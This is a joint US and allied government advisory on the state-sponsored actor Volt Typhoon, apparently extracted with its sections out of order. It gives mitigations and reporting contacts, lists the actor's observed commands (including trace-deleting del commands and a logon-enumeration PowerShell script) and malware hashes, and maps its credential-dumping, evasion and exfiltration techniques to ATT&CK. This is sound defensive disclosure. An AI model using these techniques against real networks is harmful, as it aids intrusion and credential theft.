Using cloud only administrators that are asynchronous with on-premises environments and ensuring on-premises administrators are asynchronous to the cloud.
Using CISA’s SCuBAGear tool to discover cloud misconfigurations in Microsoft cloud tenants. SCuBA gear is automation script for comparing Federal Civilian Executive Branch (FCEB) agency tenant configurations against CISA M365 baseline recommendations. SCuBAGear is part of CISA’s Secure Cloud Business Applications (SCuBA) project, which provides guidance for FCEB agencies, securing their cloud business application environments and protecting federal information created, accessed, shared, and stored in those environments. Although tailored to FCEB agencies, the project provides security guidance applicable to all organizations with cloud environments. For more information on SCuBAGear see CISA’s Secure Cloud Business Applications (SCuBA) Project.
Using endpoint detection and response capabilities to actively defend on-premises federation servers.



Secure Remote Access Services

Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best practices, including auditing the network for systems using RDP, closing unused RDP ports, and logging RDP login attempts.
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 (SMBv3) after mitigating existing dependencies (on existing systems or applications), as they may break when disabled.
Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see page 8 of the guide).
Apply mitigations from the joint Guide to Securing Remote Access Software.

Secure Sensitive Data

Securely store sensitive data (including operational technology documentation, network diagrams, etc.), ensuring that only authenticated and authorized users can access the data.

Implement Network Segmentation

Ensure that sensitive accounts use their administrator credentials only on hardened, secure computers. This practice can reduce lateral movement exposure within networks.
Conduct comprehensive trust assessments to identify business-critical trusts and apply necessary controls to prevent unauthorized cross-forest/domain traversal.
Harden federated authentication by enabling Secure Identifier (SID) Filtering and Selective Authentication on AD trust relationships to further restrict unauthorized access across domain boundaries.
Implement network segmentation to isolate federation servers from other systems and limit allowed traffic to systems and protocols that require access in accordance with Zero Trust principles.

Secure Cloud Assets

Harden cloud assets in accordance with vendor-provided or industry standard hardening guidance.

Organizations with Microsoft cloud infrastructure, see CISA’s Microsoft 365 Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Microsoft Defender for Office 365, Azure Active Directory (now known as Microsoft Entra ID), Exchange Online, OneDrive for Business, Power BI, Power Platform, SharePoint Online, and Teams. For additional guidance, see the Australian Signals Directorate’s Blueprint for Secure Cloud.
Organizations with Google cloud infrastructure, see CISA’s Google Workspace Security Configuration Baseline Guides, which provide minimum viable secure configuration baselines for Groups for Business, GMAIL, Google Calendar, Google Chat, Google Common Controls, Google Classroom, Google Drive and Docs, Google Meet, and Google Sites.


Revoke unnecessary public access to cloud environment. This involves reviewing and restricting public endpoints and ensuring that services like storage accounts, databases, and virtual machines are not publicly accessible unless absolutely necessary. Disable legacy authentication protocols across all cloud services and platforms. Legacy protocols frequently lack support for advanced security mechanisms such as multifactor authentication, rendering them susceptible to compromises. Instead, enforce the use of modern authentication protocols that support stronger security features like MFA, token-based authentication, and adaptive authentication measures.

Enforce this practice through the use of Conditional Access Policies. These policies can initially be run in report-only mode to identify potential impacts and plan mitigations before fully enforcing them. This approach allows organizations to systematically control access to their cloud resources, significantly reducing the risk of unauthorized access and potential compromise.


Regularly monitor and audit privileged cloud-based accounts, including service accounts, which are frequently abused to enable broad cloud resource access and persistence.

Be Prepared

Ensure logging is turned on for application, access, and security logs (e.g., intrusion detection systems/intrusion prevention systems, firewall, data loss prevention, and VPNs) [CPG 2T]. Given Volt Typhoon’s use of LOTL techniques and their significant dwell time, application event logs may be a valuable resource to hunt for Volt Typhoon activity because these logs typically remain on endpoints for relatively long periods of time.

For OT assets where logs are non-standard or not available, collect network traffic and communications between those assets and other assets.
Implement file integrity monitoring (FIM) tools to detect unauthorized changes.


Store logs in a central system, such as a security information and event management (SIEM) tool or central database.

Ensure the logs can only be accessed or modified by authorized and authenticated users [CPG 2U].
Store logs for a period informed by risk or pertinent regulatory guidelines.
Tune log alerting to reduce noise while ensuring there are alerts for high-risk activities. (For information on alert tuning, see joint guide Identifying and Mitigating Living Off the Land Techniques.)


Establish and continuously maintain a baseline of installed tools and software, account behavior, and network traffic. This way, network defenders can identify potential outliers, which may indicate malicious activity. Note: For information on establishing a baseline, see joint guide Identifying and Mitigating Living off the Land Techniques.
Document a list of threats and cyber actor TTPs relevant to your organization (e.g., based on industry or sectors), and maintain the ability (such as via rules, alerting, or commercial prevention and detection systems) to detect instances of those key threats [CPG 3A].
Implement periodic training for all employees and contractors that covers basic security concepts (such as phishing, business email compromise, basic operational security, password security, etc.), as well as fostering an internal culture of security and cyber awareness [CPG 2I].

Tailor the training to network IT personnel/administrators and other key staff based on relevant organizational cyber threats and TTPs, such as Volt Typhoon. For example, communicate that Volt Typhoon actors are known to target personal email accounts of IT staff, and encourage staff to protect their personal email accounts by using strong passwords and implementing MFA.
In addition to basic cybersecurity training, ensure personnel who maintain or secure OT as part of their regular duties receive OT-specific cybersecurity training on at least an annual basis [CPG 2J].
Educate users about the risks associated with storing unprotected passwords.



OT Administrators and Defenders

Change default passwords [CPG 2A] and ensure they meet the policy requirements for complexity. If the asset’s password cannot be changed, implement compensating controls for the device; for example, segment the device into separate enclaves and implement increased monitoring and logging.
Require that passwords for all OT password-protected assets be at least 15 characters, when technically feasible. In instances where minimum passwords lengths are not technically feasible (for example, assets in remote locations), apply compensating controls, record the controls, and log all login attempts. [CPG 2B].
Enforce strict access policies for accessing OT networks. Develop strict operating procedures for OT operators that details secure configuration and usage.
Segment OT assets from IT environments by [CPG 2F]:

Denying all connections to the OT network by default unless explicitly allowed (e.g., by IP address and port) for specific system functionality.
Requiring necessary communications paths between IT and OT networks to pass through an intermediary, such as a properly configured firewall, bastion host, “jump box,” or a demilitarized zone (DMZ), which is closely monitored, captures network logs, and only allows connections from approved assets.


Closely monitor all connections into OT networks for misuse, anomalous activity, or OT protocols.
Monitor for unauthorized controller change attempts. Implement integrity checks of controller process logic against a known good baseline. Ensure process controllers are prevented from remaining in remote program mode while in operation if possible.
Lock or limit set points in control processes to reduce the consequences of unauthorized controller access.
Be prepared by:

Determining your critical operational processes’ reliance on key IT infrastructure:

Maintain and regularly update an inventory of all organizational OT assets.
Understand and evaluate cyber risk on “as-operated” OT assets.
Create an accurate “as-operated” OT network map and identify OT and IT network inter-dependencies.


Identifying a resilience plan that addresses how to operate if you lose access to or control of the IT and/or OT environment.

Plan for how to continue operations if a control system is malfunctioning, inoperative, or actively acting contrary to the safe and reliable operation of the process.
Develop workarounds or manual controls to ensure ICS networks can be isolated if the connection to a compromised IT environment creates risk to the safe and reliable operation of OT processes.


Create and regularly exercise an incident response plan.

Regularly test manual controls so that critical functions can be kept running if OT networks need to be taken offline.


Implement regular data backup procedures on OT networks.

Regularly test backup procedures.




Follow risk-informed guidance in the joint advisory NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational Technologies and Control Systems, the NSA advisory Stop Malicious Cyber Activity Against Connected Operational Technology.

CONTACT INFORMATION
US organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact:

CISA’s 24/7 Operations Center at Report@cisa.gov or 1-844-Say-CISA (1-844-729-2472) or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For NSA client requirements or general cybersecurity inquiries, contact Cybersecurity_Requests@nsa.gov.
Water and Wastewater Systems Sector organizations, contact the EPA Water Infrastructure and Cyber Resilience Division at watercyberta@epa.gov to voluntarily provide situational awareness.
Entities required to report incidents to DOE should follow established reporting requirements, as appropriate. For other energy sector inquiries, contact EnergySRMA@hq.doe.gov.
For transportation entities regulated by TSA, report to CISA Central in accordance with the requirements found in applicable Security Directives, Security Programs, or TSA Order.

Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
New Zealand organizations: Report cyber security incidents to incidents@ncsc.govt.nz or call 04 498 7654.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or, for urgent assistance, call 03000 200 973.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 5 through Table 17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES
[1] fofa[2] Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques[3] GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet[4] GitHub - sandialabs/gait: Zeek Extension to Collect Metadata for Profiling of Endpoints and Proxies[5] The Zeek Network Security Monitor
RESOURCES
Microsoft: Volt Typhoon targets US critical infrastructure with living-off-the-land techniquesSecureworks: Chinese Cyberespionage Group BRONZE SILHOUETTE Targets U.S. Government and Defense Organizations
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.
ACKNOWLEDGEMENTS
Fortinet and Microsoft contributed to this advisory.
VERSION HISTORY
February 7, 2024: Initial Version.March 7, 2024: Updated Mitigations section to add recommendation on “end of life” technology.
APPENDIX A: VOLT TYPHOON OBSERVED COMMANDS / LOTL ACTIVITY
See Table 2 and Table 3 for Volt Typhoon commands and PowerShell scripts observed by the U.S. authoring agencies during incident response activities. For additional commands used by Volt Typhoon, see joint advisory People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.

Table 2: Volt Typhoon Observed Commands in PowerShell Console History


Command/Script
Description/Use




Get-EventLog security -instanceid 4624 -after {redacted date} | fl * | Out-File 'C:\users\public\documents\user.dat'  
PowerShell command extracts security log entries with the Event ID 4624 after a specified date. The output is formatted (fl *) and saved to user.dat. Potentially used to analyze logon patterns and identify potential targets for lateral movement.


Get-EventLog security -instanceid 4624 | Where-Object {$_.message.contains('{redacted user account}')} | select -First 1 | fl *  
PowerShell command extracts security log entries with the Event ID 4624 and filters them to include only those containing a specific user account, selecting the first instance of such an event.


wminc process get name,processid
Appears to be an attempt to use the wmic command but with a misspelling (wminc instead of wmic). This command, as it stands, would not execute successfully and would return an error in a typical Windows environment. This could indicate a mistake made during manual input.


wmic process get name,processid  
WMI command lists all running processes with process names and process IDs. Potentially used to find process IDs needed for other operations, like memory dumping.


tasklist /v  
Command displays detailed information about currently running processes, including the name, PID, session number, and memory usage.


taskkill /f /im rdpservice.exe
Command forcibly terminates the process rdpservice.exe. Potentially used as a cleanup activity post-exploitation.


ping -n 1 {redacted IP address}
Command sends one ICMP echo request to a specified IP address.


ping -n 1 -w 1 {redacted IP address}
Command sends one ICMP echo request to a specified IP address with a timeout (-w) of 1 millisecond.


net user
Lists all user accounts on the local machine or domain, useful for quickly viewing existing user accounts.



quser
 
query user

Displays information about user sessions on a system, aiding in identifying active users or sessions.


net start
Lists all active services.


cmd
Opens a new instance of the command prompt.


cd [Redacted Path]
Changes the current directory to a specified path, typically for navigating file systems.


Remove-Item .\Thumbs.db
PowerShell command to delete the Thumbs.db file, possibly for cleanup or removing traces.


move .\Thumbs.db ttt.dat
Relocates and renames the file Thumbs.db in the current directory to ttt.dat within the same directory.


del .\Thumbs.db /f /s /q
Force deletes Thumbs.db files from the current directory and all subdirectories, part of cleanup operations to erase traces.


del ??
Deletes files with two-character names, potentially a targeted cleanup command.


del /?
Displays help information for the del command.


exit
Terminates the command prompt session.


ipconfig
Retrieves network configuration details, helpful for discovery and mapping the victim's network.


net time /dom
Queries or sets the network time for a domain, potentially used for reconnaissance or to manipulate system time.


netstta -ano
Intended as netstat -ano; a mistyped command indicating a potential operational error.


netstat -ano
Lists active network connections and processes, helpful for identifying communication channels and potential targets.


type .\Notes.txt
Displays the contents of Notes.txt, possibly used for extracting specific information or intelligence gathering.


logoff
Logs off the current user session.




Table 3: Volt Typhoon Observed PowerShell Scripts


Script name and location
Contents
Description/Use




C:\{redacted}\logins.ps1

# Find DC list from Active Directory
$DCs = Get-ADDomainController -Filter *
 
# Define time for report (default is 1 day)
$startDate = (get-date).AddDays(-1)
 
# Store successful logon events from security logs with the specified dates and workstation/IP in an array
foreach ($DC in $DCs){
$slogonevents = Get-Eventlog -LogName Security -ComputerName $DC.Hostname -after $startDate | where {$_.eventID -eq 4624 }}
 
# Crawl through events; print all logon history with type, date/time, status, account name, computer and IP address if user logged on remotely
 
 foreach ($e in $slogonevents){
 # Logon Successful Events
 # Local (Logon Type 2)
 if (($e.EventID -eq 4624 ) -and ($e.ReplacementStrings[8] -eq 2)){
 write-host ""Type: Local Logon`tDate: ""$e.TimeGenerated ""`tStatus: Success`tUser: ""$e.ReplacementStrings[5] ""`tWorkstation: ""$e.ReplacementStrings[11]
 }
 # Remote (Logon Type 10)
 if (($e.EventID -eq 4624 ) -and ($e.ReplacementStrings[8] -eq 10)){
 write-host ""Type: Remote Logon`tDate: ""$e.TimeGenerated ""`tStatus: Success`tUser: ""$e.ReplacementStrings[5] ""`tWorkstation: ""$e.ReplacementStrings[11] ""`tIP Address: ""$e.ReplacementStrings[18]
 }}

The script is designed for user logon discovery in a Windows Active Directory environment. It retrieves a list of DCs and then queries security logs on these DCs for successful logon events (Event ID 4624) within the last day. The script differentiates between local (Logon Type 2) and remote (Logon Type 10) logon events. For each event, it extracts and displays details including the logon type, date/time of logon, status, account name, and the workstation or IP address used for the logon. Volt Typhoon may be leveraging this script to monitor user logon activities across the network, potentially to identify patterns, gather credentials, or track the movement of users and administrators within the network.



APPENDIX B: INDICATORS OF COMPROMISE
See Table 4 for Volt Typhoon IOCs obtained by the U.S. authoring agencies during incident response activities.
Note: See MAR-10448362-1.v1 for more information on this malware.

Table 4: Volt Typhoon Malicious Files and Associated Hashes


File Name
Description
MD5
Hashes (SHA256)




BrightmetricAgent.exe

The file is an FRP that could be used to reveal servers situated behind a network firewall or obscured through Network Address Translation (NAT).
 

fd41134e8ead1c18ccad27c62a260aa6
edc0c63065e88ec96197c8d7a40662a15a812a9583dc6c82b18ecd7e43b13b70


SMSvcService.exe
The file is a Windows executable ""FRPC” designed to open a reverse proxy between the compromised system and the threat actor(s) C2 server.
b1de37bf229890ac181bdef1ad8ee0c2
99b80c5ac352081a64129772ed5e1543d94cad708ba2adc46dc4ab7a0bd563f1



APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 5 through Table 17 for all referenced threat actor tactics and techniques in this advisory.

Table 5: Volt Typhoon actors ATT&CK Techniques for Enterprise – Reconnaissance


Reconnaissance
 
 


Technique Title
ID
Use




Gather Victim Host Information
T1592
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.


Gather Victim Identity Information
T1589
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s staff.


Gather Victim Identity Information: Email Addresses
T1589.002
Volt Typhoon targets the personal emails of key network and IT staff.


Gather Victim Network Information
T1590
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization’s network.


Gather Victim Org Information
T1591
Volt Typhoon conducts extensive pre-compromise reconnaissance to learn about the target organization.


Search Open Websites/Domains
T1593
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.


Search Victim-Owned Websites
T1594
Volt Typhoon conducts extensive pre-compromise reconnaissance. This includes web searches, including victim-owned sites, for victim host, identity, and network information, especially for information on key network and IT administrators.




Table 6: Volt Typhoon actors ATT&CK Techniques for Enterprise – Resource Development


Resource Development
 
 


Technique Title
ID
Use




Acquire Infrastructure: Botnet
T1583.003
Volt Typhoon uses multi-hop proxies for command-and-control infrastructure. The proxy is typically composed of Virtual Private Servers (VPSs) or small office/home office (SOHO) routers.


Compromise Infrastructure: Botnet
T1584.005
Volt Typhoon used Cisco and NETGEAR end-of-life SOHO routers implanted with KV Botnet malware to support their operations.


Compromise Infrastructure: Server
T1584.004
Volt Typhoon has redirected specific port traffic to their proxy infrastructure, effectively converting the PRTG’s Detection Guidance server into a proxy for their C2 traffic.


Develop Capabilities: Exploits
T1587.004
Volt Typhoon uses publicly available exploit code, but is also adept at discovering and exploiting vulnerabilities as zero days.


Obtain Capabilities: Exploits
T1588.005
Volt Typhoon uses publicly available exploit code, but is also adept at discovering and exploiting vulnerabilities as zero days.




Table 7: Volt Typhoon actors ATT&CK Techniques for Enterprise – Initial Access


Initial Access
 
 


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
Volt Typhoon commonly exploits vulnerabilities in networking appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco.


External Remote Services
T1133
Volt Typhoon often uses VPN sessions to securely connect to victim environments, enabling discreet follow-on intrusion activities.




Table 8: Volt Typhoon actors ATT&CK Techniques for Enterprise – Execution


Execution
 
 


Technique Title
ID
Use




Command and Scripting Interpreter
T1059
Volt Typhoon uses hands-on-keyboard execution for their malicious activity via the command-line.


Command and Scripting Interpreter: PowerShell
T1059.001
Volt Typhoon has executed clients via PowerShell.


Command and Scripting Interpreter: Unix Shell
T1059.004
Volt Typhoon has used Brightmetricagent.exe, which contains multiplexer libraries that can bi-directionally stream data over through NAT networks and contains a command-line interface (CLI) library that can leverage command shells such as PowerShell, Windows Management, Instrumentation (WMI), and Z Shell (zsh).


Windows Management Instrumentation
T1047
Volt Typhoon has used Windows Management Instrumentation Console (WMIC) commands.




Table 9: Volt Typhoon actors ATT&CK Techniques for Enterprise – Persistence


Persistence
 
 


Technique Title
ID
Use




Valid Accounts
T1078
Volt Typhoon primarily relies on valid credentials for persistence.




Table 10: Volt Typhoon actors ATT&CK Techniques for Enterprise – Privilege Escalation


Privilege Escalation
 
 


Technique Title
ID
Use




Exploitation for Privilege Escalation
T1068
Volt Typhoon first obtains credentials from public-facing appliances after gaining initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.




Table 11: Volt Typhoon actors ATT&CK Techniques for Enterprise – Defense Evasion


Defense Evasion
 
 


Technique Title
ID
Use




Direct Volume Access
T1006
Volt Typhoon has executed the Windows-native vssadmin command to create a volume shadow copy.


Indicator Removal: Clear Persistence
T1070.009
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Indicator Removal: Clear Windows Event Logs
T1070.001
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Indicator Removal: File Deletion
T1070.004
Volt Typhoon created systeminfo.dat in C:\Users\Public\Documents, but subsequently deleted it.


Masquerading: Match Legitimate Name or Location
T1036.005
Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity and masquerading file names.


Modify Registry
T1112
Volt Typhoon has used the netsh command, a legitimate Windows command, to create a PortProxy registry modification on the PRTG server.


Obfuscated Files or Information: Software Packing
T1027.002
Volt Typhoon has obfuscated FRP client files (BrightmetricAgent.exe and SMSvcService.exe) and the command-line port scanning utility ScanLine by packing the files with Ultimate Packer for Executables (UPX).


System Binary Proxy Execution
T1218
Volt Typhoon uses hands-on-keyboard activity via the command-line and use other native tools and processes on systems (often referred to as “LOLBins”), known as LOTL, to maintain and expand access to the victim networks.




Table 12: Volt Typhoon actors ATT&CK Techniques for Enterprise – Credential Access


Credential Access
 
 


Technique Title
ID
Use




Brute Force: Password Cracking
T1110.002
Volt Typhoon has exfiltrated NTDS.dit and SYSTEM registry hive to crack passwords offline.


Credentials from Password Stores
T1555
Volt Typhoon has installed browsers saved passwords history, credit card details, and cookies.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003
Volt Typhoon has strategically targeted network administrator web browser data, focusing on both browsing history and stored credentials.


OS Credential Dumping: LSASS Memory
T1003.001
Volt Typhoon used a DLL with MiniDump and the process ID of Local Security Authority Subsystem Service (LSASS) to dump the LSASS process memory and obtain credentials.


OS Credential Dumping: NTDS
T1003.003
Volt Typhoon appears to prioritize obtaining valid credentials by extracting the Active Directory database file (NTDS.dit).


Unsecured Credentials
T1552
Volt Typhoon has obtained credentials insecurely stored on an appliance.


Unsecured Credentials: Private Keys
T1552.004
Volt Typhoon has accessed a Local State file that contains the Advanced Encryption Standard (AES) encryption key used to encrypt the passwords stored in the Chrome browser, which enables the actors to obtain plaintext passwords stored in the Login Data file in the Chrome browser.




Table 13: Volt Typhoon actors ATT&CK Techniques for Enterprise – Discovery


Discovery
 
 


Technique Title
ID
Use




Account Discovery: Local Account
T1087.001
Volt Typhoon executed net user and quser for user account information.


Application Window Discovery
T1010
Volt Typhoon created and accessed a file named rult3uil.log on a Domain Controller in C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised system, showcasing a combination of window title information and focus shifts, keypresses, and command executions across Google Chrome and Windows PowerShell, with corresponding timestamps.


Browser Information Discovery
T1217
Volt Typhoon has installed browsers saved passwords history, credit card details, and cookies.


File and Directory Discovery
T1083
Volt Typhoon enumerated several directories​, including directories containing vulnerability testing and cyber related content and facilities data, such as construction drawings.


Log Enumeration
T1654
Volt Typhoon has captured successful logon events.


Network Service Discovery
T1046
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


Peripheral Device Discovery
T1120
Volt Typhoon has obtained the victim's system screen dimension and display devices information.


Permission Groups Discovery
T1069
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


Process Discovery
T1057
Volt Typhoon executed tasklist /v to gather a detailed process listing.


Query Registry
T1012
Volt Typhoon has interacted with a PuTTY application by enumerating existing stored sessions.


Software Discovery
T1518
Volt Typhoon has obtained the victim's list of applications installed on the victim's system.


System Information Discovery
T1082
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


System Location Discovery
T1614
Volt Typhoon has obtained the victim's system current locale.


System Network Configuration Discovery: Internet Connection Discovery
T1016.001
Volt Typhoon employs ping with various IP addresses to check network connectivity and net start to list running services.


System Owner/User Discovery
T1033
Volt Typhoon has used commercial tools, LOTL utilities, and appliances already present on the system for system information, network service, group, and user discovery.


System Service Discovery
T1007
Volt Typhoon employs ping with various IP addresses to check network connectivity and net start to list running services.


System Time Discovery
T1124
Volt Typhoon has obtained the victim's system timezone.




Table 14: Volt Typhoon actors ATT&CK Techniques for Enterprise – Lateral Movement


Lateral Movement
 
 


Technique Title
ID
Use




Remote Service Session Hijacking
T1563
Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, operational technology systems, and network security devices. This would enable them to access these critical systems.


Remote Services: Cloud Services
T1021.007
During the period of Volt Typhoon’s known network presence, there were anomalous login attempts to an Azure tenant potentially using credentials previously compromised from theft of NTDS.dit.


Remote Services: Remote Desktop Protocol
T1021.001
Volt Typhoon has moved laterally to the Domain Controller via an interactive RDP session using a compromised account with domain administrator privileges.


Use Alternate Authentication Material
T1550
Volt Typhoon may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement.


Valid Accounts: Cloud Accounts
T1078.004
During the period of Volt Typhoon’s known network presence, there were anomalous login attempts to an Azure tenant potentially using credentials previously compromised from theft of NTDS.dit.




Table 15: Volt Typhoon actors ATT&CK Techniques for Enterprise – Collection


Collection
 
 


Technique Title
ID
Use




Archive Collected Data
T1560
Volt Typhoon collected sensitive information obtained from a file server in multiple zipped files.


Archive Collected Data: Archive via Utility
T1560.001
Volt Typhoon has compressed and archived the extracted ntds.dit and accompanying registry files (by executing ronf.exe, which was likely a renamed version of rar.exe).


Data Staged
T1074
Volt Typhoon accessed the file C:\Users\{redacted}\Downloads\History.zip, which presumably contained data from the User Data directory of the user’s Chrome browser, which the actors likely saved in the Downloads directory for exfiltration.


Screen Capture
T1113
Volt Typhoon has obtained a screenshot of the victim's system using two libraries (gdi32.dll and gdiplus.dll)




Table 16: Volt Typhoon actors ATT&CK Techniques for Enterprise – Command and Control


Command and Control
 
 


Technique Title
ID
Use




Encrypted Channel
T1573
Volt Typhoon has setup FRP clients on a victim’s corporate infrastructure to establish covert communications channels for command and control.


Ingress Tool Transfer
T1105
Volt Typhoon uses legitimate, but outdated versions of network admin tools. For example, in one confirmed compromise, actors downloaded an outdated version of comsvcs.dll, on the DC in a non-standard folder.


Proxy
T1090
Volt Typhoon has setup FRP clients on a victim’s corporate infrastructure to establish covert communications channels for command and control.


Proxy: Internal Proxy
T1090.001
Volt Typhoon has used the netsh command, a legitimate Windows command, to create a PortProxy registry modification on the PRTG server.


Proxy: Multi-hop Proxy
T1090.003
Volt Typhoon uses multi-hop proxies for command-and-control infrastructure.




Table 17: Volt Typhoon actors ATT&CK Techniques for Enterprise – Exfiltration


Exfiltration
 
 




Technique Title
ID
Use


Exfiltration Over Alternative Protocol
T1048
Volt Typhoon exfiltrated files via Server Message Block (SMB).









This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'TA0008', 'T1083', 'T1654', 'T1078.004', 'TA0010', 'T1552', 'T1593', 'T1059.004', 'TA0005', 'T1070.009', 'T1560', 'T1573', 'T1594', 'T1021.007', 'T1016', 'T1584.004', 'T1584.005', 'T1190', 'T1068', 'T1010', 'T1560.001', 'T1110.002', 'T1003.001', 'T1105', 'T1036.005', 'T1082', 'T1087.001', 'T1112', 'TA0043', 'T1069', 'T1590', 'T1217', 'T1113', 'T1090.001', 'T1550', 'T1588.005', 'T1078', 'T1563', 'T1555', 'T1070.004', 'T1090', 'T1552.004', 'TA0001', 'T1046', 'T1007', 'T1057', 'T1583.003', 'T1133', 'T1218', 'T1012', 'T1518', 'T1059.001', 'T1033', 'T1027.002', 'T1059', 'T1614', 'T1074', 'T1003.003', 'T1016.001', 'T1021.001', 'TA0009', 'T1587.004', 'T1047', 'T1592', 'T1124', 'T1006', 'T1589', 'T1070.001', 'T1120', 'T1555.003', 'T1048', 'T1591', 'T1090.003', 'T1589.002'}","






Actions to take today to mitigate Volt Typhoon activity:




Apply patches for internet-facing systems. Prioritize patching critical vulnerabilities in appliances known to be frequently exploited by Volt Typhoon.
Implement phishing-resistant MFA.
Ensure logging is turned on for application, access, and security logs and store logs in a central system.
Plan “end of life” for technology beyond manufacturer’s supported lifecycle.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China (PRC) state-sponsored cyber actors are seeking to pre-position themselves on IT networks for disruptive or destructive cyberattacks against U.S. critical infrastructure in the event of a major crisis or conflict with the United States.
CISA, NSA, FBI and the following partners are releasing this advisory to warn critical infrastructure organizations about this assessment, which is based on observations from the U.S. authoring agencies’ incident response activities at critical infrastructure organizations compromised by the PRC state-sponsored cyber group known as Volt Typhoon (also known as Vanguard Panda, BRONZE SILHOUETTE, Dev-0391, UNC3236, Voltzite, and Insidious Taurus):

U.S. Department of Energy (DOE)
U.S. Environmental Protection Agency (EPA)
U.S. Transportation Security Administration (TSA)
Australian Signals Directorate’s (ASD’s) Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS), a part of the Communications Security Establishment (CSE)
United Kingdom National Cyber Security Centre (NCSC-UK)
New Zealand National Cyber Security Centre (NCSC-NZ)

The U.S. authoring agencies have confirmed that Volt Typhoon has compromised the IT environments of multiple critical infrastructure organizations—primarily in Communications, Energy, Transportation Systems, and Water and Wastewater Systems Sectors—in the continental and non-continental United States and its territories, including Guam. Volt Typhoon’s choice of targets and pattern of behavior is not consistent with traditional cyber espionage or intelligence gathering operations, and the U.S. authoring agencies assess with high confidence that Volt Typhoon actors are pre-positioning themselves on IT networks to enable lateral movement to OT assets to disrupt functions. The U.S. authoring agencies are concerned about the potential for these actors to use their network access for disruptive effects in the event of potential geopolitical tensions and/or military conflicts. CCCS assesses that the direct threat to Canada’s critical infrastructure from PRC state-sponsored actors is likely lower than that to U.S. infrastructure, but should U.S. infrastructure be disrupted, Canada would likely be affected as well, due to cross-border integration. ASD’s ACSC and NCSC-NZ assess Australian and New Zealand critical infrastructure, respectively, could be vulnerable to similar activity from PRC state-sponsored actors.
As the authoring agencies have previously highlighted, the use of living off the land (LOTL) techniques is a hallmark of Volt Typhoon actors’ malicious cyber activity when targeting critical infrastructure. The group also relies on valid accounts and leverage strong operational security, which combined, allows for long-term undiscovered persistence. In fact, the U.S. authoring agencies have recently observed indications of Volt Typhoon actors maintaining access and footholds within some victim IT environments for at least five years. Volt Typhoon actors conduct extensive pre-exploitation reconnaissance to learn about the target organization and its environment; tailor their tactics, techniques, and procedures (TTPs) to the victim’s environment; and dedicate ongoing resources to maintaining persistence and understanding the target environment over time, even after initial compromise.
The authoring agencies urge critical infrastructure organizations to apply the mitigations in this advisory and to hunt for similar malicious activity using the guidance herein provided, along with the recommendations found in joint guide Identifying and Mitigating Living Off the Land Techniques. These mitigations are primarily intended for IT and OT administrators in critical infrastructure organizations. Following the mitigations for prevention of or in response to an incident will help disrupt Volt Typhoon’s accesses and reduce the threat to critical infrastructure entities.
If activity is identified, the authoring agencies strongly recommend that critical infrastructure organizations apply the incident response recommendations in this advisory and report the incident to the relevant agency (see Contact Information section).
